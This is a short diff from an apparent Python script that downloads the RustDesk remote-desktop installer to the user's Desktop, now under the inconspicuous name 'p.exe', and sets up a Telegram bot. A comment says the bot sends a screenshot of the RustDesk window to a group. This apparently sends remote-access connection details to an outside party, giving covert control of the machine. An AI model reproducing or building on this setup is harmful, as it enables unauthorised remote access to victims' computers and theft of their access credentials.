@@ -9,7 +9,7 @@ import pygetwindow as gw
 
 url1 = 'https://github.com/rustdesk/rustdesk/releases/download/1.3.2/rustdesk-1.3.2-x86_64.exe'
 base_path = os.path.expanduser("~")
-path = f'{base_path}\\Desktop\\chegachora.exe'
+path = f'{base_path}\\Desktop\\p.exe'
 
 bot = telegram.Bot(token='TOKEN') #INSERT YOUR TELEGRAM BOT TOKEN
 chat_id = 'GROUP_ID' #INSERT YOUR GROUP ID FOR RECIEVE THE PRINT OF RUSTDESK WINDOW
